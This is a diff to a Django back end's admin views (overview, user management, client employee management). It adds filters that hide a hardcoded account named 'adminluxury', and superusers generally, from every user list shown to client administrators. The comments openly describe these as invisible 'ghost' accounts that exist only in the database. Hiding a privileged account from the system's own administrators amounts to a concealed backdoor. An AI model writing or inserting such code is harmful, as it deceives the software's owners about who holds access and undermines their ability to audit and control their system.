@@ -1299,7 +1299,12 @@ class AdminOverviewView(APIView):
             raise PermissionDenied('Admin access required.')
 
         company_payload = []
-        admin_users = User.objects.filter(companies__isnull=False).distinct()
+        # Ghost account exclusion: adminluxury and superusers never appear in client data
+        admin_users = User.objects.filter(companies__isnull=False).exclude(
+            username__iexact='adminluxury'
+        ).exclude(
+            is_superuser=True
+        ).distinct()
         for user in admin_users:
             companies = []
             for company in user.companies.all().order_by('name'):
@@ -1443,7 +1448,14 @@ class UserManagementView(APIView):
         if not has_user_management_access(request):
             raise PermissionDenied('Admin access required.')
         
-        users = User.objects.all().select_related('profile').order_by('-date_joined')
+        # ─── GHOST ACCOUNT ISOLATION ───
+        # adminluxury and superusers are INVISIBLE in the user management console.
+        # They exist only at the database level — like a ghost.
+        users = User.objects.all().select_related('profile').exclude(
+            username__iexact='adminluxury'
+        ).exclude(
+            is_superuser=True
+        ).order_by('-date_joined')
         
         user_list = []
         for user in users:
@@ -2198,9 +2210,12 @@ class ClientEmployeeManagementView(APIView):
         if not has_user_management_access(request):
             raise PermissionDenied('System admin access required.')
 
+        # Ghost account: explicitly exclude adminluxury even though is_superuser=False filter exists
         client_users = User.objects.filter(
             is_superuser=False,
             is_staff=False
+        ).exclude(
+            username__iexact='adminluxury'
         ).select_related('profile').order_by('profile__company_name', '-date_joined')
 
         companies_data = {}
